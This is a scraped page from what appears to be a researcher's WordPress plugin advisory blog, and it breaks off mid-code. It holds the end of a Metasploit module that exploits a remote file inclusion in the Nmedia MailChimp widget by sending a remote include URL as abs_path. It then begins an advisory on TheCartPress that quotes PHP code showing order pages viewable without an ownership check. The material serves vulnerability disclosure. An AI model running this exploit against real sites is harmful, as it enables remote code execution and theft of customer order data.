class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">OptString</span><span class="crayon-sy">.</span><span class="crayon-e">new</span><span class="crayon-sy">(</span><span class="crayon-s">'PHPURI'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-h"> </span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"The URI to request"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'/wp-content/plugins/nmedia-mailchimp-widget/api_mailchimp/postToMailChimp.php'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">self</span><span class="crayon-sy">.</span><span class="crayon-t">class</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-48">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">def </span><span class="crayon-e">php_exploit</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-50"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">postdata</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'abs_path='</span><span class="crayon-h"> </span><span class="crayon-o">&lt;&lt;</span><span class="crayon-h"> </span><span class="crayon-e">php_include_url</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-51">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-52"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">print_status</span><span class="crayon-sy">(</span><span class="crayon-s">"Sending exploit request..."</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">response</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">send_request_raw</span><span class="crayon-sy">(</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'global'</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-55"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'method'</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'POST'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-56"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'uri'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">datastore</span><span class="crayon-sy">[</span><span class="crayon-s">'PHPURI'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-57"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'data'</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">postdata</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-58"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'headers'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-60"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Content-Type'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">'application/x-www-form-urlencoded'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'Content-Length'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">postdata</span><span class="crayon-sy">.</span><span class="crayon-i">length</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-64">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-e">response </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-v">response</span><span class="crayon-sy">.</span><span class="crayon-i">code</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-cn">200</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">print_error</span><span class="crayon-sy">(</span><span class="crayon-s">"Got a non-200 response back. The server may not be vulnerable (#{response.code})"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-68">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">handler</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-70"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">end</span></div><div class="crayon-line" id="crayon-53c9877b9b97c893894775-71">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9b97c893894775-72"><span class="crayon-st">end</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0213 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/nmedia-mailchimp-widget/" rel="tag">Nmedia Mailchimp Widget</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/06/21/wordpress-nmedia-mailchimp-widget-abs_path-remote-file-inclusion-vulnerability/#respond" title="Comment on WordPress Nmedia MailChimp widget &#8220;abs_path&#8221; remote file inclusion vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-11 -->

				
					
<article id="post-9" class="post-9 post type-post status-publish format-standard hentry category-advisories tag-thecartpress tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/06/20/wordpress-thecartpress-plugin-order-information-security-bypass/" title="12:32 pm" rel="bookmark" class="entry-date"><time datetime="2012-06-20T12:32:41+00:00" pubdate>June 20, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/06/20/wordpress-thecartpress-plugin-order-information-security-bypass/" title="Permalink to WordPress TheCartPress plugin order information security bypass" rel="bookmark">WordPress TheCartPress plugin order information security bypass</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49652/">Secunia Advisory SA 49652</a></p>
<p><strong>Analysis</strong><br />
TheCartPress has functionality for an admin to view and print an order. This functionality extends also to the customer to print the order. By providing the orderID, the user can view and print the order. However there was a distinct lack of any validation about whether or not the user requesting the order owned it.</p>
<p>The entry point to print an order is <a href="http://plugins.svn.wordpress.org/thecartpress/tags/1.1.9.1/admin/PrintOrder.php">/admin/PrintOrder.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b9c07e344412449" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$order_id  = isset( $_REQUEST['order_id'] ) ? $_REQUEST['order_id'] : 0;
$file_name  = 'tcp_print_order.php';
$template   = STYLESHEETPATH . '/' . $file_name;
$template   = apply_filters( 'tcp_get_print_order_template', $template, $order_id );
if ( file_exists( $template ) ) {
    include( $template );
} else {
    $template = get_template_directory() . '/' . $file_name;
    if ( STYLESHEETPATH != get_template_directory() &amp;&amp; file_exists( $template ) ) {
        include( $template );
    } else {
        $template = TCP_THEMES_TEMPLATES_FOLDER . $file_name;
        if ( file_exists( $template ) ) {
            include( $template );
        }
    }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-2">2</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-4">4</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-6">6</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-8">8</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-10">10</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-12">12</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-14">14</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c07e344412449-16">16</div><div class="crayon-num" data-line="crayon-53c9877b9c07e344412449-17">17</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b9c07e344412449-1"><span class="crayon-sy">$</span><span class="crayon-v">order_id</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'order_id'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'order_id'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-2"><span class="crayon-sy">$</span><span class="crayon-v">file_name</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'tcp_print_order.php'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-3"><span class="crayon-sy">$</span><span class="crayon-v">template</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">STYLESHEETPATH</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/'</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">file_name</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-4"><span class="crayon-sy">$</span><span class="crayon-v">template</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">apply_filters</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">'tcp_get_print_order_template'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">template</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">order_id</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-5"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">file_exists</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">template</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">template</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-7"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">template</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_template_directory</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'/'</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">file_name</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">STYLESHEETPATH</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-e">get_template_directory</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">file_exists</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">template</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">template</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">template</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">TCP_THEMES_TEMPLATES_FOLDER</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">file_name</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">file_exists</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">template</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">include</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">template</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c07e344412449-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9877b9c07e344412449-17"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0099 seconds] -->
<p>This fetches the template that is going to be used to used for the page to be printed. By default, this is <a href="http://plugins.svn.wordpress.org/thecartpress/tags/1.1.9.1/themes-templates/tcp_print_order.php">/theme-templates/tcp_print_order.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b9c08e210774861" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
    if ( isset( $_REQUEST['order_id'] ) ) {
        require_once( TCP_CLASSES_FOLDER . 'OrderPage.class.php' );
        $order_id = $_REQUEST['order_id'];
        OrderPage::show( $order_id, true );
    }</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b9c08e210774861-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c08e210774861-2">2</div><div class="crayon-num" data-line="crayon-53c9877b9c08e210774861-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c08e210774861-4">4</div><div class="crayon-num" data-line="crayon-53c9877b9c08e210774861-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b9c08e210774861-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'order_id'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c08e210774861-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">TCP_CLASSES_FOLDER</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'OrderPage.class.php'</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c08e210774861-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">order_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'order_id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c08e210774861-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">OrderPage</span><span class="crayon-o">::</span><span class="crayon-e">show</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c08e210774861-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0031 seconds] -->
<p>The template goes ahead and passes on the order_id in the request to the OrderPage::show method. Notice that at no point has there been any validation of the order belonging to the user requesting the page. Anyway, we call into the show method, which is in fact the only method on the OrderPage class in <a href="http://plugins.svn.wordpress.org/thecartpress/tags/1.1.9.1/classes/OrderPage.class.php">/classes/OrderPage.class.php</a>:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877b9c098345629096" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
class OrderPage {

    static function show( $order_id, $see_comment = true, $echo = true, $see_address = true, $see_full = false ) {
        require_once( TCP_CLASSES_FOLDER . 'CartTable.class.php' );
